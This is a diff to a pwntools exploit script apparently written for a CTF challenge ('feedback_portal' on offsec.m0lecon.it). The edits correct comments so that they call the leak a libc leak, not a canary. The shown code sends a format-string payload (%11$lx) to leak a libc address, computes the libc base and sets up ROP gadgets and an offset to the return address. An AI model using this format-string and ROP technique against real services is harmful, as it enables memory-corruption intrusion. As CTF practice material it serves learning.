@@ -4,7 +4,7 @@ from pwn import *
 elf = context.binary = ELF('./feedback_portal', checksec=False)
 libc = ELF('./libc.so.6', checksec=False)
 
-#canary is the 23rd element that gets printed from the stack when using %p... as name
+#libc leak is the 11th element that gets printed from the stack when using %lx
 libcIDX = 11
 OFFSET_TO_RIP = 136
 RET = 0x000000000040101a
@@ -16,7 +16,7 @@ pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
 p = remote("offsec.m0lecon.it", 13576)
 
 p.recvuntil(b'name:\n')
-#gets canary for this execution
+#gets libc leak for this execution
 p.sendline(f"%{libcIDX}$lx".encode())
 
 data = p.recvuntil(b'Now leave your feedback:')
@@ -28,6 +28,7 @@ text = data.decode()
 leak = "0x" + text.split("Hello, ")[1].split()[0]
 leak = int(leak, 16)
 
+#symbol corresponding to the leak obtained with info symbols in gdb
 offset = libc.symbols["_IO_2_1_stderr_"]
 libc_base = leak - offset
 #print(hex(offset))
